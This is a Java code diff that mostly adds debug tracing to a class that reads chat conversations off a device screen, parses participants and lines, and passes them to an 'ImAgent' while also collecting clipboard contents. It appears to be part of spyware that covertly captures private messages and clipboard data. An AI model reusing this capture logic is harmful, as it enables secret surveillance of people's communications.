@@ -80,6 +80,16 @@ public class ConversationScreen {
                         // exploreField(screen, 0, new String[0]);
                     } else {
                         // se conversation e' uguale all'ultima parsata non fare niente.
+                        //#ifdef DBC
+                        Check.asserts(conversations.containsKey(screen),
+                                "conversation doesn't contain screen");
+                        //#endif
+
+                        //#ifdef DEBUG
+                        debug.trace("getConversationScreen screen: "
+                                + conversations.get(screen));
+                        //#endif
+                        
                         Integer hash = (Integer) conversations.get(screen);
                         if (hash.equals(new Integer(Encryption
                                 .CRC32(newConversation)))) {
@@ -102,9 +112,15 @@ public class ConversationScreen {
                                 "wrong size result:  " + result.size());
                         //#endif
 
+                        //#ifdef DEBUG
+                        debug.trace("getConversationScreen: extract vector elements");
+                        //#endif
                         String partecipants = (String) result.elementAt(0);
                         Vector lines = (Vector) result.elementAt(1);
 
+                        //#ifdef DEBUG
+                        debug.trace("getConversationScreen: calling agent");
+                        //#endif
                         ImAgent agent = ImAgent.getInstance();
                         agent.add(partecipants, lines);
 
@@ -149,12 +165,6 @@ public class ConversationScreen {
 
             clip = (String) Clipboard.getClipboard().get();
             ClipBoardAgent.getInstance().setClip(clip);
-
-            if (!conversations.containsKey(screen)) {
-                //#ifdef DEBUG
-                debug.info("adding clip to screens: " + clip);
-                //#endif
-            }
 
         } else {
             //#ifdef DEBUG
@@ -224,6 +234,11 @@ public class ConversationScreen {
     private static Vector parseLinesConversation(String conversation,
             int posMessages) {
         try {
+            //#ifdef DEBUG
+            debug.trace("parseLinesConversation: " + conversation);
+            debug.trace("parseLinesConversation posMessages="+posMessages);
+            //#endif
+            
             //#ifdef DBC
             Check.requires(partecipants != null, "null partecipants");
             Check.requires(parts != null && parts.size() > 1, "null parts");
@@ -246,15 +261,18 @@ public class ConversationScreen {
                 String currentLine = StringUtils.getNextLine(conversation,
                         posMessages);
                 if (currentLine == null) {
+                    //#ifdef DEBUG
+                    debug.trace("parseLinesConversation null line, posMessage: " + posMessages); 
+                    //#endif
                     break;
                 }
                 posMessages += currentLine.length() + 1;
 
-                if (numLine < 5) {
+                //if (numLine < 5) {
                     //#ifdef DEBUG
                     debug.trace("line " + numLine + " : " + currentLine);
                     //#endif
-                }
+                //}
                 numLine += 1;
 
                 int lineStart = searchPartecipantIter(currentLine);
@@ -267,16 +285,19 @@ public class ConversationScreen {
                     //#endif
                     String ll = lastLine.trim();
                     if (!StringUtils.empty(ll)) {
+                        //#ifdef DEBUG
+                        debug.trace("parseLinesConversation adding last line: " + ll);
+                        //#endif
                         lines.addElement(ll);
                     } else {
                         //#ifdef DEBUG
-                        debug.trace("parseLinesConversation: empty line");
+                        debug.trace("parseLinesConversation last: empty line");
                         //#endif
                     }
                     lastLine = currentLine;
                 } else {
                     //#ifdef DEBUG
-                    debug.trace("parseConversation adding line: " + currentLine);
+                    debug.trace("parseConversation increasing line: " + currentLine);
                     //#endif
                     lastLine += " " + currentLine;
                 }
@@ -285,12 +306,15 @@ public class ConversationScreen {
             //adding last line
             String ll = lastLine.trim();
             if (!StringUtils.empty(ll)) {
+              //#ifdef DEBUG
+                debug.trace("parseLinesConversation adding last line: " + ll);
+                //#endif
                 lines.addElement(ll);
             }
 
             //agent.add(partecipants, lines);
             //#ifdef DEBUG
-            debug.info("num lines: " + numLine);
+            debug.info("parseLinesConversation num lines: " +lines.size()+"/" + numLine );
             //#endif
             result.addElement(partecipants);
             result.addElement(lines);
